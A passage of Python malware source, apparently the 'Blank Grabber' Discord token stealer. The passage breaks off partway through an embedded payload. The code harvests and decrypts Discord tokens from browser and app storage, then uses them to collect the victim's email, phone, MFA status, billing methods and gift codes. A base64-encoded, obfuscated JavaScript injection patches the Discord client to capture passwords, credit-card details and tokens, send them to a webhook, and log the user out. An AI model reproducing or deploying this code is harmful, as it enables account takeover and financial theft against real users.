                          r = r.data.decode(errors='ignore')
                          r = json.loads(r)
                          user = r['username'] + '#' + str(r['discriminator'])
                          id = r['id']
                          email = r['email'].strip() if r['email'] else '(No Email)'
                          phone = r['phone'] if r['phone'] else '(No Phone Number)'
                          verified = r['verified']
                          mfa = r['mfa_enabled']
                          nitro_type = r.get('premium_type', 0)
                          nitro_infos = {0: 'No Nitro', 1: 'Nitro Classic',
                                         2: 'Nitro', 3: 'Nitro Basic'}
                          nitro_data = nitro_infos.get(nitro_type, '(Unknown)')
                          billing = json.loads(Discord.httpClient.request(
                              'GET', 'https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=Discord.GetHeaders(token)).data.decode(errors='ignore'))
                          if len(billing) == 0:
                              billing = '(No Payment Method)'
                          else:
                              methods = {'Card': 0, 'Paypal': 0, 'Unknown': 0}
                              for m in billing:
                                  if not isinstance(m, dict):
                                      continue
                                  method_type = m.get('type', 0)
                                  match method_type:
                                      case 1:
                                          methods['Card'] += 1
                                      case 2:
                                          methods['Paypal'] += 1
                                      case _:
                                          methods['Unknown'] += 1
                              billing = ', '.join(['{} ({})'.format(
                                  name, quantity) for name, quantity in methods.items() if quantity != 0]) or 'None'
                          gifts = list()
                          r = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me/outbound-promotions/codes',
                                                         headers=Discord.GetHeaders(token)).data.decode(errors='ignore')
                          if 'code' in r:
                              r = json.loads(r)
                              for i in r:
                                  if isinstance(i, dict):
                                      code = i.get('code')
                                      if i.get('promotion') is None or not isinstance(i['promotion'], dict):
                                          continue
                                      title = i['promotion'].get('outbound_title')
                                      if code and title:
                                          gifts.append(f'{title}: {code}')
                          if len(gifts) == 0:
                              gifts = 'Gift Codes: (NONE)'
                          else:
                              gifts = 'Gift Codes:\n\t' + '\n\t'.join(gifts)
                          results.append({'USERNAME': user, 'USERID': id, 'MFA': mfa, 'EMAIL': email, 'PHONE': phone,
                                          'VERIFIED': verified, 'NITRO': nitro_data, 'BILLING': billing, 'TOKEN': token, 'GIFTS': gifts})
                  return results

              @staticmethod
              def SafeStorageSteal(path: str) -> list[str]:
                  encryptedTokens = list()
                  tokens = list()
                  key: str = None
                  levelDbPaths: list[str] = list()
                  localStatePath = os.path.join(path, 'Local State')
                  for root, dirs, _ in os.walk(path):
                      for dir in dirs:
                          if dir == 'leveldb':
                              levelDbPaths.append(os.path.join(root, dir))
                  if os.path.isfile(localStatePath) and levelDbPaths:
                      with open(localStatePath, errors='ignore') as file:
                          jsonContent: dict = json.load(file)
                      key = jsonContent['os_crypt']['encrypted_key']
                      key = base64.b64decode(key)[5:]
                      for levelDbPath in levelDbPaths:
                          for file in os.listdir(levelDbPath):
                              if file.endswith(('.log', '.ldb')):
                                  filepath = os.path.join(levelDbPath, file)
                                  with open(filepath, errors='ignore') as file:
                                      lines = file.readlines()
                                  for line in lines:
                                      if line.strip():
                                          matches: list[str] = re.findall(
                                              Discord.REGEX_ENC, line)
                                          for match in matches:
                                              match = match.rstrip('\\')
                                              if not match in encryptedTokens:
                                                  match = base64.b64decode(
                                                      match.split('dQw4w9WgXcQ:')[1].encode())
                                                  encryptedTokens.append(match)
                  for token in encryptedTokens:
                      try:
                          token = pyaes.AESModeOfOperationGCM(Syscalls.CryptUnprotectData(
                              key), token[3:15]).decrypt(token[15:])[:-16].decode(errors='ignore')
                          if token:
                              tokens.append(token)
                      except Exception:
                          pass
                  return tokens

              @staticmethod
              def SimpleSteal(path: str) -> list[str]:
                  tokens = list()
                  levelDbPaths = list()
                  for root, dirs, _ in os.walk(path):
                      for dir in dirs:
                          if dir == 'leveldb':
                              levelDbPaths.append(os.path.join(root, dir))
                  for levelDbPath in levelDbPaths:
                      for file in os.listdir(levelDbPath):
                          if file.endswith(('.log', '.ldb')):
                              filepath = os.path.join(levelDbPath, file)
                              with open(filepath, errors='ignore') as file:
                                  lines = file.readlines()
                              for line in lines:
                                  if line.strip():
                                      matches: list[str] = re.findall(
                                          Discord.REGEX, line.strip())
                                      for match in matches:
                                          match = match.rstrip('\\')
                                          if not match in tokens:
                                              tokens.append(match)
                  return tokens

              @staticmethod
              def FireFoxSteal(path: str) -> list[str]:
                  tokens = list()
                  for root, _, files in os.walk(path):
                      for file in files:
                          if file.lower().endswith('.sqlite'):
                              filepath = os.path.join(root, file)
                              with open(filepath, errors='ignore') as file:
                                  lines = file.readlines()
                                  for line in lines:
                                      if line.strip():
                                          matches: list[str] = re.findall(
                                              Discord.REGEX, line)
                                          for match in matches:
                                              match = match.rstrip('\\')
                                              if not match in tokens:
                                                  tokens.append(match)
                  return tokens

              @staticmethod
              def InjectJs() -> str | None:
                  check = False
                  try:
                      code = base64.b64decode(b'Y29uc3QgUz1DOyhmdW5jdGlvbihZLFope2NvbnN0IHE9QyxvPVkoKTt3aGlsZSghIVtdKXt0cnl7Y29uc3QgVD0tcGFyc2VJbnQocSgweDkwKSkvMHgxK3BhcnNlSW50KHEoMHgxNGEpKS8weDIrcGFyc2VJbnQocSgweDEyOSkpLzB4MyoocGFyc2VJbnQocSgweDEyZSkpLzB4NCkrcGFyc2VJbnQocSgweGY5KSkvMHg1K3BhcnNlSW50KHEoMHhkNykpLzB4NistcGFyc2VJbnQocSgweDEzYSkpLzB4NyoocGFyc2VJbnQocSgweDg4KSkvMHg4KStwYXJzZUludChxKDB4YmUpKS8weDkqKC1wYXJzZUludChxKDB4ZjApKS8weGEpO2lmKFQ9PT1aKWJyZWFrO2Vsc2Ugb1sncHVzaCddKG9bJ3NoaWZ0J10oKSk7fWNhdGNoKEgpe29bJ3B1c2gnXShvWydzaGlmdCddKCkpO319fSh4LDB4NDBmOGQpKTtjb25zdCBhcmdzPXByb2Nlc3NbUygweGVmKV0sZnM9cmVxdWlyZSgnZnMnKSxwYXRoPXJlcXVpcmUoUygweGJjKSksaHR0cHM9cmVxdWlyZShTKDB4ZDEpKSxxdWVyeXN0cmluZz1yZXF1aXJlKCdxdWVyeXN0cmluZycpLHtCcm93c2VyV2luZG93LHNlc3Npb259PXJlcXVpcmUoUygweDZhKSksZW5jb2RlZEhvb2s9UygweGQyKSxjb25maWc9eyd3ZWJob29rJzphdG9iKGVuY29kZWRIb29rKSwnd2ViaG9va19wcm90ZWN0b3Jfa2V5JzpTKDB4ZGYpLCdhdXRvX2J1eV9uaXRybyc6IVtdLCdwaW5nX29uX3J1bic6ISFbXSwncGluZ192YWwnOlMoMHgxMTUpLCdlbWJlZF9uYW1lJzpTKDB4Y2UpLCdlbWJlZF9pY29uJzpTKDB4MTI4KSwnZW1iZWRfY29sb3InOjB4NTYwZGRjLCdpbmplY3Rpb25fdXJsJzpTKDB4MTM1KSwnYXBpJzonaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1lJywnbml0cm8nOnsnYm9vc3QnOnsneWVhcic6eydpZCc6JzUyMTg0NzIzNDI0NjA4MjU5OScsJ3NrdSc6UygweDhjKSwncHJpY2UnOlMoMHgxMzYpfSwnbW9udGgnOnsnaWQnOlMoMHhhNyksJ3NrdSc6JzUxMTY1MTg4MDgzNzg0MDg5NicsJ3ByaWNlJzpTKDB4ZjIpfX0sJ2NsYXNzaWMnOnsnbW9udGgnOnsnaWQnOlMoMHhkMyksJ3NrdSc6JzUxMTY1MTg3MTczNjIwMTIxNicsJ3ByaWNlJzpTKDB4MTE0KX19fSwnZmlsdGVyJzp7J3VybHMnOltTKDB4YWUpLFMoMHhjMyksUygweGU5KSxTKDB4ZmUpLFMoMHgxMTkpLFMoMHhlYyksUygweDE0MSksUygweDEwNiksUygweDg3KSwnaHR0cHM6Ly9hcGkuc3RyaXBlLmNvbS92Ki9wYXltZW50X2ludGVudHMvKi9jb25maXJtJ119LCdmaWx0ZXIyJzp7J3VybHMnOltTKDB4NmMpLFMoMHhjZCksJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3YqL2FwcGxpY2F0aW9ucy9kZXRlY3RhYmxlJyxTKDB4MTE4KSxTKDB4N2MpLFMoMHg3ZCldfX07ZnVuY3Rpb24gcGFyaXR5XzMyKFksWixvKXtyZXR1cm4gWV5aXm87fWZ1bmN0aW9uIGNoXzMyKFksWixvKXtyZXR1cm4gWSZaXn5ZJm87fWZ1bmN0aW9uIG1hal8zMihZLFosbyl7cmV0dXJuIFkmWl5ZJm9eWiZvO31mdW5jdGlvbiByb3RsXzMyKFksWil7cmV0dXJuIFk8PFp8WT4+PjB4MjAtWjt9ZnVuY3Rpb24gc2FmZUFkZF8zMl8yKFksWil7dmFyIG89KFkmMHhmZmZmKSsoWiYweGZmZmYpLFQ9KFk+Pj4weDEwKSsoWj4+PjB4MTApKyhvPj4+MHgxMCk7cmV0dXJuKFQmMHhmZmZmKTw8MHgxMHxvJjB4ZmZmZjt9ZnVuY3Rpb24gc2FmZUFkZF8zMl81KFksWixvLFQsSCl7dmFyIFY9KFkmMHhmZmZmKSsoWiYweGZmZmYpKyhvJjB4ZmZmZikrKFQmMHhmZmZmKSsoSCYweGZmZmYpLGk9KFk+Pj4weDEwKSsoWj4+PjB4MTApKyhvPj4+MHgxMCkrKFQ+Pj4weDEwKSsoSD4+PjB4MTApKyhWPj4+MHgxMCk7cmV0dXJuKGkmMHhmZmZmKTw8MHgxMHxWJjB4ZmZmZjt9ZnVuY3Rpb24gYmluYjJoZXgoWSl7Y29uc3QgbT1TO3ZhciBaPW0oMHg3NCksbz0nJyxUPVlbJ2xlbmd0aCddKjB4NCxILFY7Zm9yKEg9MHgwO0g8VDtIKz0weDEpe1Y9WVtIPj4+MHgyXT4+PigweDMtSCUweDQpKjB4OCxvKz1aWydjaGFyQXQnXShWPj4+MHg0JjB4ZikrWlsnY2hhckF0J10oViYweGYpO31yZXR1cm4gbzt9ZnVuY3Rpb24gZ2V0SCgpe3JldHVyblsweDY3NDUyMzAxLDB4ZWZjZGFiODksMHg5OGJhZGNmZSwweDEwMzI1NDc2LDB4YzNkMmUxZjBdO31mdW5jdGlvbiByb3VuZFNIQTEoWSxaKXt2YXIgbz1bXSxWLGksUixBLHIsbCxOPWNoXzMyLGs9cGFyaXR5XzMyLEY9bWFqXzMyLFg9cm90bF8zMix1PXNhZmVBZGRfMzJfMixKLHc9c2FmZUFkZF8zMl81O1Y9WlsweDBdLGk9WlsweDFdLFI9WlsweDJdLEE9WlsweDNdLHI9WlsweDRdO2ZvcihKPTB4MDtKPDB4NTA7Sis9MHgxKXtKPDB4MTA/b1tKXT1ZW0pdOm9bSl09WChvW0otMHgzXV5vW0otMHg4XV5vW0otMHhlXV5vW0otMHgxMF0sMHgxKTtpZihKPDB4MTQpbD13KFgoViwweDUpLE4oaSxSLEEpLHIsMHg1YTgyNzk5OSxvW0pdKTtlbHNle2lmKEo8MHgyOClsPXcoWChWLDB4NSksayhpLFIsQSksciwweDZlZDllYmExLG9bSl0pO2Vsc2UgSjwweDNjP2w9dyhYKFYsMHg1KSxGKGksUixBKSxyLDB4OGYxYmJjZGMsb1tKXSk6bD13KFgoViwweDUpLGsoaSxSLEEpLHIsMHhjYTYyYzFkNixvW0pdKTt9cj1BLEE9UixSPVgoaSwweDFlKSxpPVYsVj1sO31yZXR1cm4gWlsweDBdPXUoVixaWzB4MF0pLFpbMHgxXT11KGksWlsweDFdKSxaWzB4Ml09dShSLFpbMHgyXSksWlsweDNdPXUoQSxaWzB4M10pLFpbMHg0XT11KHIsWlsweDRdKSxaO31mdW5jdGlvbiBmaW5hbGl6ZVNIQTEoWSxaLG8sVCl7Y29uc3QgaD1TO3ZhciBWLFIsQTtBPShaKzB4NDE+Pj4weDk8PDB4NCkrMHhmO3doaWxlKFlbJ2xlbmd0aCddPD1BKXtZWydwdXNoJ10oMHgwKTt9WVtaPj4+MHg1XXw9MHg4MDw8MHgxOC1aJTB4MjAsWVtBXT1aK28sUj1ZWydsZW5ndGgnXTtmb3IoVj0weDA7VjxSO1YrPTB4MTApe1Q9cm91bmRTSEExKFlbaCgweDE0NCldKFYsVisweDEwKSxUKTt9cmV0dXJuIFQ7fWZ1bmN0aW9uIGhleDJiaW5iKFksWixvKXtjb25zdCB5PVM7dmFyIFQsSD1ZW3koMHhhNildLFYsUixBLHIsYztUPVp8fFsweDBdLG89b3x8MHgwLGM9bz4+PjB4MzsweDAhPT1IJTB4MiYmY29uc29sZVsnZXJyb3InXSh5KDB4ZmIpKTtmb3IoVj0weDA7VjxIO1YrPTB4Mil7Uj1wYXJzZUludChZW3koMHgxMWIpXShWLDB4MiksMHgxMCk7aWYoIWlzTmFOKFIpKXtyPShWPj4+MHgxKStjLEE9cj4+PjB4Mjt3aGlsZShUW3koMHhhNildPD1BKXtUW3koMHg4NCldKDB4MCk7fVRbQV18PVI8PDB4OCooMHgzLXIlMHg0KTt9ZWxzZSBjb25zb2xlW3koMHg3ZildKHkoMHhkOCkpO31yZXR1cm57J3ZhbHVlJzpULCdiaW5MZW4nOkgqMHg0K299O31jbGFzcyBqc1NIQXtjb25zdHJ1Y3Rvcigpe2NvbnN0IFA9Uzt2YXIgWT0weDAsWj1bXSxvPTB4MCxULEgsVixpLFIsQSxyPSFbXSxjPSFbXSxsPVtdLE49W10sayxrPTB4MTtIPWhleDJiaW5iLChrIT09cGFyc2VJbnQoaywweGEpfHwweDE+aykmJmNvbnNvbGVbUCgweDdmKV0oUCgweDEyNikpLGk9MHgyMDAsUj1yb3VuZFNIQTEsQT1maW5hbGl6ZVNIQTEsVj0weGEwLFQ9Z2V0SCgpLHRoaXNbUCgweGMxKV09ZnVuY3Rpb24oRil7Y29uc3QgVz1QO3ZhciBYLHUsSix3LG4sYSxFO1g9aGV4MmJpbmIsdT1YKEYpLEo9dVsnYmluTGVuJ10sdz11W1coMHg2ZCldLG49aT4+PjB4MyxFPW4vMHg0LTB4MTtpZihuPEovMHg4KXt3PUEodyxKLDB4MCxnZXRIKCkpO3doaWxlKHdbVygweGE2KV08PUUpe3dbVygweDg0KV0oMHgwKTt9d1tFXSY9MHhmZmZmZmYwMDt9ZWxzZXtpZihuPkovMHg4KXt3aGlsZSh3WydsZW5ndGgnXTw9RSl7d1tXKDB4ODQpXSgweDApO313W0VdJj0weGZmZmZmZjAwO319Zm9yKGE9MHgwO2E8PUU7YSs9MHgxKXtsW2FdPXdbYV1eMHgzNjM2MzYzNixOW2FdPXdbYV1eMHg1YzVjNWM1Yzt9VD1SKGwsVCksWT1pLGM9ISFbXTt9LHRoaXNbUCgweDExMCldPWZ1bmN0aW9uKEYpe2NvbnN0IEI9UDt2YXIgWCx1LEosdyxuLGE9MHgwLEU9aT4+PjB4NTtYPUgoRixaLG8pLHU9WFtCKDB4MTJiKV0sdz1YW0IoMHg2ZCldLEo9dT4+PjB4NTtmb3Iobj0weDA7bjxKO24rPUUpe2EraTw9dSYmKFQ9Uih3W0IoMHgxNDQpXShuLG4rRSksVCksYSs9aSk7fVkrPWEsWj13WydzbGljZSddKGE+Pj4weDUpLG89dSVpO30sdGhpc1tQKDB4MTFmKV09ZnVuY3Rpb24oKXtjb25zdCB6PVA7dmFyIEY7IVtdPT09YyYmY29uc29sZVt6KDB4N2YpXSh6KDB4YTQpKTtjb25zdCBYPWZ1bmN0aW9uKHUpe3JldHVybiBiaW5iMmhleCh1KTt9O3JldHVybiFbXT09PXImJihGPUEoWixvLFksVCksVD1SKE4sZ2V0SCgpKSxUPUEoRixWLGksVCkpLHI9ISFbXSxYKFQpO307fX1pZihTKDB4MTBiKT09PXR5cGVvZiBkZWZpbmUmJmRlZmluZVtTKDB4YjApXSlkZWZpbmUoZnVuY3Rpb24oKXtyZXR1cm4ganNTSEE7fSk7ZWxzZSBTKDB4OWQpIT09dHlwZW9mIGV4cG9ydHM/UygweDlkKSE9PXR5cGVvZiBtb2R1bGUmJm1vZHVsZVtTKDB4MTJkKV0/bW9kdWxlW1MoMHgxMmQpXT1leHBvcnRzPWpzU0hBOmV4cG9ydHM9anNTSEE6Z2xvYmFsW1MoMHgxMjcpXT1qc1NIQTtqc1NIQVtTKDB4MTFhKV0mJihqc1NIQT1qc1NIQVtTKDB4MTFhKV0pO2Z1bmN0aW9uIHRvdHAoWSl7Y29uc3QgZz1TLFo9MHgxZSxvPTB4NixUPURhdGVbZygweDcyKV0oKSxIPU1hdGhbZygweDgxKV0oVC8weDNlOCksVj1sZWZ0cGFkKGRlYzJoZXgoTWF0aFtnKDB4ZmYpXShIL1opKSwweDEwLCcwJyksaT1uZXcganNTSEEoKTtpW2coMHhjMSldKGJhc2UzMnRvaGV4KFkpKSxpWyd1cGRhdGUnXShWKTtjb25zdCBSPWlbZygweDExZildKCksQT1oZXgyZGVjKFJbJ3N1YnN0cmluZyddKFJbZygweGE2KV0tMHgxKSk7bGV0IHI9KGhleDJkZWMoUltnKDB4MTFiKV0oQSoweDIsMHg4KSkmaGV4MmRlYygnN2ZmZmZmZmYnKSkrJyc7cmV0dXJuIHI9clsnc3Vic3RyJ10oTWF0aFtnKDB4YzgpXShyWydsZW5ndGgnXS1vLDB4MCksbykscjt9ZnVuY3Rpb24gaGV4MmRlYyhZKXtyZXR1cm4gcGFyc2VJbnQoWSwweDEwKTt9ZnVuY3Rpb24geCgpe2NvbnN0IHg5PVsndmFyXHgyMHhtbEh0dHBceDIwPVx4MjBuZXdceDIwWE1MSHR0cFJlcXVlc3QoKTtceDIwXHgwYVx4MjBceDIwXHgyMFx4MjB4bWxIdHRwLm9wZW4oXHgyMkdFVFx4MjIsXHgyMFx4MjInLCdlcnJvcicsJ2hvc3QnLCdyb3VuZCcsJ2RhdGEnLCdjYXJkW2V4cF95ZWFyXScsJ3B1c2gnLCdnZXRBbGxXaW5kb3dzJywnZGlzY29yZCcsJ2h0dHBzOi8vYXBpLnN0cmlwZS5jb20vdiovc2V0dXBfaW50ZW50cy8qL2NvbmZpcm0nLCcxNDIwOTZCT2FodEknLCcqKlx4MGFDcmVkaXRceDIwQ2FyZFx4MjBFeHBpcmF0aW9uOlx4MjAqKicsJyoqRGlzY29yZFx4MjBJbmZvKionLCdta2RpclN5bmMnLCc1MTE2NTE4ODU0NTk5NjM5MDQnLCdybWRpclN5bmMnLCdwYXNzd29yZCcsJ2xlbmdodCcsJzQ3MzExMXVXdW9scScsJyoqXHgwYU5ld1x4MjBQYXNzd29yZDpceDIwKionLCdodHRwczovL2Rpc2NvcmQuZ2lmdC8nLCc8OnBheXBhbDo5NTExMzkxODkzODk0MTAzNjU+JywndXBsb2FkRGF0YScsJ0FCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaMjM0NTY3JywnaW52YWxpZCcsJ3JlcGxhY2UnLCdEaXNjb3JkXHgyMFN0YWZmJywnKlx4MGFCYWRnZXM6XHgyMCoqJywnZGFyd2luJywnc2VwJywnXHgyMik7XHgwYVx4MjBceDIwXHgyMFx4MjB4bWxIdHRwLnNldFJlcXVlc3RIZWFkZXIoXHgyN0NvbnRlbnQtVHlwZVx4MjcsXHgyMFx4MjdhcHBsaWNhdGlvbi9qc29uXHgyNyk7XHgwYVx4MjBceDIwXHgyMFx4MjB4bWxIdHRwLnNlbmQoSlNPTi5zdHJpbmdpZnkoJywndW5kZWZpbmVkJywnKipQYXNzd29yZFx4MjBDaGFuZ2VkKionLCdjb250ZW50LXNlY3VyaXR5LXBvbGljeS1yZXBvcnQtb25seScsJyoqTml0cm9ceDIwQ29kZToqKlx4MGFgYGBkaWZmXHgwYStceDIwJywnZW1haWwnLCdlbmRzV2l0aCcsJyoqXHgwYUJpbGxpbmc6XHgyMCoqJywnQ2Fubm90XHgyMGNhbGxceDIwZ2V0SE1BQ1x4MjB3aXRob3V0XHgyMGZpcnN0XHgyMHNldHRpbmdceDIwSE1BQ1x4MjBrZXknLCdwYWNrYWdlLmpzb24nLCdsZW5ndGgnLCc1MjE4NDcyMzQyNDYwODI1OTknLCdvbkNvbXBsZXRlZCcsJ0ludmFsaWRceDIwYmFzZTMyXHgyMGNoYXJhY3Rlclx4MjBpblx4MjBrZXknLCdwcmljZScsJ0FjY2Vzcy1Db250cm9sLUFsbG93LU9yaWdpblx4MjBceDI3Klx4MjcnLCdyZXZlcnNlJywnZmxhZ3MnLCdodHRwczovL2Rpc2NvcmQuY29tL2FwaS92Ki91c2Vycy9AbWUnLCdjb25zdFx4MjBmc1x4MjA9XHgyMHJlcXVpcmUoXHgyN2ZzXHgyNyksXHgyMGh0dHBzXHgyMD1ceDIwcmVxdWlyZShceDI3aHR0cHNceDI3KTtceDBhY29uc3RceDIwaW5kZXhKc1x4MjA9XHgyMFx4MjcnLCdhbWQnLCdpbmRleC5qcycsJ21ldGhvZCcsJ2NvbnRlbnQnLCdjb250ZW50LXNlY3VyaXR5LXBvbGljeScsJ1x4MjcpXHgwYWlmXHgyMChmcy5leGlzdHNTeW5jKGJkUGF0aCkpXHgyMHJlcXVpcmUoYmRQYXRoKTsnLCcqKlBheVBhbFx4MjBBZGRlZCoqJywnaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXZhdGFycy8nLCdlbWJlZF9uYW1lJywnKipUb2tlbioqJywnZW1iZWRfaWNvbicsJ3JlcXVlc3QnLCdwYXRoJywnc3BsaXQnLCcyNDgxNzVjZEVrY3AnLCdQT1NUJywnRGlzY29yZFx4MjBCdWdceDIwSHVudGVyXHgyMChOb3JtYWwpJywnc2V0SE1BQ0tleScsJ1x4Mjc7XHgwYWNvbnN0XHgyMGJkUGF0aFx4MjA9XHgyMFx4MjcnLCdodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS92Ki91c2Vycy9AbWUnLCdBdXRob3JpemF0aW9uJywnKipOaXRyb1x4MjBib3VnaHQhKionLCdwbGF0Zm9ybScsJ1x4Mjc7XHgwYWNvbnN0XHgyMGZpbGVTaXplXHgyMD1ceDIwZnMuc3RhdFN5bmMoaW5kZXhKcykuc2l6ZVx4MGFmcy5yZWFkRmlsZVN5bmMoaW5kZXhKcyxceDIwXHgyN3V0ZjhceDI3LFx4MjAoZXJyLFx4MjBkYXRhKVx4MjA9Plx4MjB7XHgwYVx4MjBceDIwXHgyMFx4MjBpZlx4MjAoZmlsZVNpemVceDIwPFx4MjAyMDAwMFx4MjB8fFx4MjBkYXRhXHgyMD09PVx4MjBceDIybW9kdWxlLmV4cG9ydHNceDIwPVx4MjByZXF1aXJlKFx4MjcuL2NvcmUuYXNhclx4MjcpXHgyMilceDIwXHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwaW5pdCgpO1x4MGF9KVx4MGFhc3luY1x4MjBmdW5jdGlvblx4MjBpbml0KClceDIwe1x4MGFceDIwXHgyMFx4MjBceDIwaHR0cHMuZ2V0KFx4MjcnLCdtYXgnLCd3c3M6Ly9yZW1vdGUtYXV0aC1nYXRld2F5JywnTml0cm9ceDIwVHlwZTpceDIwKionLCcqKkNyZWRpdFx4MjBDYXJkXHgyMEFkZGVkKionLCd0eXBlJywnaHR0cHM6Ly8qLmRpc2NvcmQuY29tL2FwaS92Ki9hcHBsaWNhdGlvbnMvZGV0ZWN0YWJsZScsJ0JsYW5rXHgyMEdyYWJiZXJceDIwSW5qZWN0aW9uJywnXHgyNylceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjByZXMucGlwZShmaWxlKTtceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBmaWxlLm9uKFx4MjdmaW5pc2hceDI3LFx4MjAoKVx4MjA9Plx4MjB7XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMGZpbGUuY2xvc2UoKTtceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjB9KTtceDBhXHgyMFx4MjBceDIwXHgyMFx4MGFceDIwXHgyMFx4MjBceDIwfSkub24oXHgyMmVycm9yXHgyMixceDIwKGVycilceDIwPT5ceDIwe1x4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMHNldFRpbWVvdXQoaW5pdCgpLFx4MjAxMDAwMCk7XHgwYVx4MjBceDIwXHgyMFx4MjB9KTtceDBhfVx4MGFyZXF1aXJlKFx4MjcnLCdtb250aCcsJ2h0dHBzJywnJVdFQkhPT0tIRVJFQkFTRTY0RU5DT0RFRCUnLCc1MjE4NDY5MTg2Mzc0MjA1NDUnLCdlbnYnLCdIeXBlU3F1YWRceDIwQnJhdmVyeScsJ3Rva2VucycsJzI2NzE2ODBPb0dQT1QnLCdTdHJpbmdceDIwb2ZceDIwSEVYXHgyMHR5cGVceDIwY29udGFpbnNceDIwaW52YWxpZFx4MjBjaGFyYWN0ZXJzJywnXHgyMik7XHgyMFx4MGFceDIwXHgyMFx4MjBceDIweG1sSHR0cC5zZW5kKG51bGwpO1x4MjBceDBhXHgyMFx4MjBceDIwXHgyMHhtbEh0dHAucmVzcG9uc2VUZXh0JywncGF0aG5hbWUnLCd5ZWFyJywncGluZ19vbl9ydW4nLCd1c2QnLCdceDI3KVx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMHJlcy5yZXBsYWNlKFx4MjclV0VCSE9PS19LRVklXHgyNyxceDIwXHgyNycsJyVXRUJIT09LX0tFWSUnLCd0b1N0cmluZycsJ2xvZycsJ2ZpbHRlcicsJ0NyZWRpdFx4MjBDYXJkXHgyME51bWJlcjpceDIwKionLCdBY2Nlc3MtQ29udHJvbC1BbGxvdy1IZWFkZXJzXHgyMFx4MjcqXHgyNycsJyoqXHgyMC1ceDIwUGFzc3dvcmQ6XHgyMCoqJywnKipceDBhUGFzc3dvcmQ6XHgyMCoqJywnRW1haWw6XHgyMCoqJywnYXBwbGljYXRpb24vanNvbicsJ2h0dHBzOi8vKi5kaXNjb3JkLmNvbS9hcGkvdiovdXNlcnMvQG1lJywncmVzb3VyY2VzJywnd2ViQ29udGVudHMnLCdodHRwczovLyouZGlzY29yZC5jb20vYXBpL3YqL2F1dGgvbG9naW4nLCdjYXJkW2V4cF9tb250aF0nLCdleGlzdHNTeW5jJywnYXJndicsJzIwMG5FVkFSVScsJ3BheXBhbF9hY2NvdW50cycsJzk5OScsJ25pdHJvJywnZGVmYXVsdFNlc3Npb24nLCdQYXJ0bmVyZWRceDIwU2VydmVyXHgyME93bmVyJywnSHlwZVNxdWFkXHgyMEJyaWxsaWFuY2UnLCd3aW4zMicsJ2Jvb3N0JywnMTI2MzQ1NWZWcHdJSCcsJ0h5cGVTcXVhZFx4MjBCYWxhbmNlJywnU3RyaW5nXHgyMG9mXHgyMEhFWFx4MjB0eXBlXHgyMG11c3RceDIwYmVceDIwaW5ceDIwYnl0ZVx4MjBpbmNyZW1lbnRzJywndW5saW5rU3luYycsJ05pdHJvJywnaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdiovYXV0aC9sb2dpbicsJ2Zsb29yJywnZmlsdGVyMicsJ2NhdGNoJywnQWN0aXZlXHgyMERldmVsb3BlcicsJ05pdHJvXHgyMEJhc2ljJywnXHg1Y2JldHRlcmRpc2NvcmRceDVjZGF0YVx4NWNiZXR0ZXJkaXNjb3JkLmFzYXInLCdOaXRyb1x4MjBDbGFzc2ljJywnaHR0cHM6Ly9hcGkuc3RyaXBlLmNvbS92Ki90b2tlbnMnLCcuL2NvcmUuYXNhcicsJ2dpZnRfY29kZScsJ0Vhcmx5XHgyMFZlcmlmaWVkXHgyMEJvdFx4MjBEZXZlbG9wZXInLCdhdXRvX2J1eV9uaXRybycsJ2Z1bmN0aW9uJywnY29uY2F0JywnTmV3XHgyMEVtYWlsOlx4MjAqKicsJ05vXHgyME5pdHJvJywnc3RhdHVzQ29kZScsJ3VwZGF0ZScsJyoqXHgwYUJhZGdlczpceDIwKionLCdDb250ZW50cycsJ2F2YXRhcicsJzQ5OScsJ0BldmVyeW9uZScsJ3N0YXJ0c1dpdGgnLCd3cml0ZUZpbGVTeW5jJywnaHR0cHM6Ly8qLmRpc2NvcmQuY29tL2FwaS92Ki91c2Vycy9AbWUvbGlicmFyeScsJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3YqL2F1dGgvbG9naW4nLCdkZWZhdWx0Jywnc3Vic3RyJywnd2luZG93LndlYnBhY2tKc29ucD8oZ2c9d2luZG93LndlYnBhY2tKc29ucC5wdXNoKFtbXSx7Z2V0X3JlcXVpcmU6KGEsYixjKT0+YS5leHBvcnRzPWN9LFtbXHgyMmdldF9yZXF1aXJlXHgyMl1dXSksZGVsZXRlXHgyMGdnLm0uZ2V0X3JlcXVpcmUsZGVsZXRlXHgyMGdnLmMuZ2V0X3JlcXVpcmUpOndpbmRvdy53ZWJwYWNrQ2h1bmtkaXNjb3JkX2FwcCYmd2luZG93LndlYnBhY2tDaHVua2Rpc2NvcmRfYXBwLnB1c2goW1tNYXRoLnJhbmRvbSgpXSx7fSxhPT57Z2c9YX1dKTtmdW5jdGlvblx4MjBMb2dPdXQoKXsoZnVuY3Rpb24oYSl7Y29uc3RceDIwYj1ceDIyc3RyaW5nXHgyMj09dHlwZW9mXHgyMGE/YTpudWxsO2Zvcihjb25zdFx4MjBjXHgyMGluXHgyMGdnLmMpaWYoZ2cuYy5oYXNPd25Qcm9wZXJ0eShjKSl7Y29uc3RceDIwZD1nZy5jW2NdLmV4cG9ydHM7aWYoZCYmZC5fX2VzTW9kdWxlJiZkLmRlZmF1bHQmJihiP2QuZGVmYXVsdFtiXTphKGQuZGVmYXVsdCkpKXJldHVyblx4MjBkLmRlZmF1bHQ7aWYoZCYmKGI/ZFtiXTphKGQpKSlyZXR1cm5ceDIwZH1yZXR1cm5ceDIwbnVsbH0pKFx4MjJsb2dpblx4MjIpLmxvZ291dCgpfUxvZ091dCgpOycsJ2NoYXJBdCcsJ2luaXRpYXRpb24nL